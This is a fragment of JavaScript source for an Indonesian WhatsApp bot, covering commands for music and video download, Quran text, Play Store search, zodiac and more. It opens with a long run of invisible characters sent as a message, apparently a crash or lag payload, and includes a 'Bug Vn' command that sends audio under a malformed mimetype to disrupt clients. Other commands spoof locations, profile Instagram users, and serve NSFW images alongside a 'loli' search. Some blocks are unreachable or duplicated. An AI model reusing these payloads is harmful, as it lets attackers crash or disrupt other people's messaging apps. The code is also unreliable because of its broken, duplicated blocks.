‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎${kas}` , text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break	
 case 'surah':
 if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isOwner) return
if (args.length < 1) return reply(`Example :\n${prefix}surah 1`)
srh = args[0]
hx.surah(srh).then(res => {
teks = '```「 AL-QURAN 」```\n\n_Lebih baik baca di al-qurannya langsung biar berkah, kalo dihp gk berkah_\n\n'
for (let i of res) {
teks += '*•> Arab :* ' + i.arab + '\n'
teks += '*•> Indo :* ' + i.indo + '\n'
teks += '*•> Latin :* ' + i.latin + '\n\n'
}
reply(teks)
})
await confirmLIMIT(sender, [angka]) 
break
case 'playstore':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`Example :\n${prefix}playstore termux`)
quer = args.join(" ")
hx.playstore(quer).then(res => {
teks = '```「 Play Store 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}\n`
teks += `${i.developer}`
}
reply(teks)
})
await confirmLIMIT(sender, [angka]) 
break
case 'styletext':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply('Enter The Text')
async function stylizeText(text) {
let res = await fetch('http://qaz.wtf/u/convert.cgi?text=' + encodeURIComponent(text))
let html = await res.text()
let dom = new JSDOM(html)
let table = dom.window.document.querySelector('table').children[0].children
let obj = {}
for (let tr of table) {
let name = tr.querySelector('.aname').innerHTML
let content = tr.children[1].textContent.replace(/^\n/, '').replace(/\n$/, '')
obj[name + (obj[name] ? ' Reversed' : '')] = content
}
return obj
}
matext = args.join(" ")
let fetch = require('node-fetch')
let { JSDOM } = require('jsdom')
reply(Object.entries(await stylizeText(matext)).map(([name, value]) => `${name}\n${value}\n`).join`\n`)
await confirmLIMIT(sender, [angka]) 
break
case 'hbd': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
let textus = args.join(" ")
if (!q) return reply(`Example:\n 2002 02 25`)
const zodiak = [
["Capricorn", new Date(1970, 0, 1)],
["Aquarius", new Date(1970, 0, 20)],
["Pisces", new Date(1970, 1, 19)],
["Aries", new Date(1970, 2, 21)],
["Taurus", new Date(1970, 3, 21)],
["Gemini", new Date(1970, 4, 21)],
["Cancer", new Date(1970, 5, 22)],
["Leo", new Date(1970, 6, 23)],
["Virgo", new Date(1970, 7, 23)],
["Libra", new Date(1970, 8, 23)],
["Scorpio", new Date(1970, 9, 23)],
["Sagittarius", new Date(1970, 10, 22)],
["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const date = new Date(textus)
if (date == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
reply(teksh)
await confirmLIMIT(sender, [angka]) 
break 
case 'searchtext':
if (args.length < 1) return reply(`${a}Wrong Format${a} What Message Are You Looking For Bro??\Example : ${prefix}searchtext halo|10`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('minimum 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await client.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Message Not Found') 
if (cok.messages.length < parseInt(batas)) reply(`Found Only ${cok.messages.length - 1} Messages`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
client.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(`${a}ERROR${a} An error occurred while searching for Messages`)
}
} else {
reply(`Wrong format, this is an example of the correct format : ${prefix}searchtext halo|15`)
}
await confirmLIMIT(sender, [angka]) 
break

			
			
/*++++++++++++++++++++++++++
+++++++++MENU BARU++++++++
+++++++++++++++++++++++++++*/           
             case 'fakeloc':
			 if (isBanned) return replysticker(banstc)
				if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = WMthumb
               client.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)     
		    break
	case 'play':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 10000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                         captions = `*PLAY*\n\n*Title* : ${title}\n\n_Silahkan pilih file media yang di download_`
							 let vvisaioa = await getBuffer(thumb)
							     vud0woid = await client.prepareMessage(from, vvisaioa, MessageType.image, {thumbnail: Buffer.alloc(0)})
const buttonvido = [
  {buttonId: `ytmp3 ${srch}`, buttonText: {displayText: 'AUDIO'}, type: 1},
  {buttonId: `video ${srch}`, buttonText: {displayText: 'VIDEO'}, type: 1},
]

const buttonMessagegacvudeia = {
    contentText: captions,
    footerText: `*Support Nekopoi.Care*\n*Offical Bot By @${numbernye.split("@")[0]}*\n*Powered By @${ow.split("@")[0]}*`,
    buttons: buttonvido,
    headerType: 4, 
	imageMessage: vud0woid.message.imageMessage
}
client.sendMessage(from, buttonMessagegacvudeia, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
		                        })                
		                        })
		                        } catch (err) {
		                        reply('EROR')
		                        }
							await confirmLIMIT(sender, [angka]) 
		                   break    

client.sendMessage(from, buttonMessagegachaceca, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
				break		
case 'ytmp3':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 10000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                        sendMediaURL(from, thumb, captions, {quoted: mek, thumbnail: Buffer.alloc(0)})
		                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply('EROR')
		                        }
							await confirmLIMIT(sender, [angka]) 
		                   break    

client.sendMessage(from, buttonMessagegachaceca, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
				break						   
			case 'ytsearch':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join('');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await client.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '❏ Title: ' + video.title + '\n'
		            ytresult += '❏ Link: ' + video.url + '\n'
		            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
		            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '◩ *SELF-BOT*'
		    		await fakethumb(tbuff,ytresult)
					await confirmLIMIT(sender, [angka]) 
					break
			case 'playmp4':
			case 'video':
			case 'ytmp4':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isPremium) return replysticker(premiumstc)
			{
                if (args.length < 1) return reply(`Kirim perintah *${prefix}playmp4 query*`)
                try {
                    let yut = await yts(q)
                    ytv(yut.videos[0].url)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 10000) return sendFileFromUrl(from, thumb, `*Data Berhasil Didapatkan!*



_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, mek)
                        const captionisu = `*DATA BERHASIL DIDAPATKAN*

Title : ${title}
Ext : MP4
Filesize : ${filesizeF}
ID : ${yut.videos[0].videoId}
Upload : ${yut.videos[0].ago}
Ditonton : ${yut.videos[0].views}
Duration : ${yut.videos[0].timestamp}
Link : ${a.data}

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionisu, mek)
                            sendFileFromUrl(from, dl_link, '', mek)
                           })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                   console.log(color('Emror', 'red'), err)
                    reply('EROR')
                }
            }
			await confirmLIMIT(sender, [angka]) 
                break
case 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					client.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })  
await confirmLIMIT(sender, [angka]) 					
break		
					case 'emoji':
			if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isPremium) return replysticker(premiumstc)
					if (!q) return reply('emojinya?')
					qes = args.join(' ')
					emoji.get(`${qes}`).then(emoji => {
					teks = `${emoji.images[4].url}`
		    		sendStickerFromUrl(from,`${teks}`)	
		    		console.log(teks)
		   			})
					await confirmLIMIT(sender, [angka]) 
		    		break
		    case 'igstalk':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
		            if (!q) return reply('Usernamenya?')
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks) 
		            })     
await confirmLIMIT(sender, [angka]) 					
		            break 


/*
]=====> GROUP MENU<=====[
*/
  

		
		    case'runtime':
		    case'test':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
		            run = process.uptime() 
		            teks = `${kyun(run)}`
		            fakegroup(teks)
		            break  
			case'speed':
			case'ping':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
					const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
					const child = stdout.toString('utf-8')
					const teks = child.replace(/Memory:/, "Ram:")
					const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
					fakegroup(pingnya)
					})
					break	
case 'trap':
case 'awoo':
case 'neko':
case 'megumin':
case 'hentai': 
case 'blowjob':
	
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
			if (!isPremium && !isOwner) return replysticker(premiumstc)
					await replysticker(loadingstc)
					anu = await fetchJson(`https://waifu.pics/api/nsfw/${command}`)
					buffer = await getBuffer(anu.url)
             nsfwwa = await client.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonsgswdf= [
  {buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1},
]

const buttonMessageswsft = {
    contentText: `Jeda 5 Detik`,
    footerText: `*Support Nekopoi.Care*\n*Offical Bot By @${numbernye.split("@")[0]}*\n*Powered By @${ow.split("@")[0]}*`,
    buttons: buttonsgswdf,
    headerType: 4, 
	imageMessage: nsfwwa.message.imageMessage
}

client.sendMessage(from, buttonMessageswsft, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
				break			
case 'cecan':
case 'cogan':
case 'husbu':
case 'waifu':
case 'loli':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
await replysticker(loadingstc)
			let gacha = await hx.pinterest(`${command}`)
            let gachaa = gacha[Math.floor(Math.random() * gacha.length)]
            let gacharandom = await getBuffer(gachaa)
               gachawa = await client.prepareMessage(from, gacharandom, MessageType.image, {thumbnail: Buffer.alloc(0)})
const buttonsgachas= [
  {buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1},
]

const buttonMessagegachaceca = {
    contentText: `Jeda 5 Detik`,
    footerText: `*Support Nekopoi.Care*\n*Offical Bot By @${numbernye.split("@")[0]}*\n*Powered By @${ow.split("@")[0]}*`,
    buttons: buttonsgachas,
    headerType: 4, 
	imageMessage: gachawa.message.imageMessage
}

client.sendMessage(from, buttonMessagegachaceca, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
				break
	  
		case 'getname':
var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = client.contacts[ambl] != undefined ? client.contacts[ambl].sname || client.contacts[ambl].notify : undefined
reply(sname)
break
// Bug Vn ( MyMans APIs )
case 'pvp':
if (!mek.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./strg/audio/Bacot.mp3')
client.sendMessage(from, tapib1, document, { quoted: mek, filename:`MyMans APIs ~ 404 ${vipi}.mp3`, mimetype: 'audio/application' })
await reply('Bang mau nanya')
break
// Get Pic ( MyMans APIs )
case 'getp':
try {
pic = await client.getProfilePicture(from)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
client.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
break
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
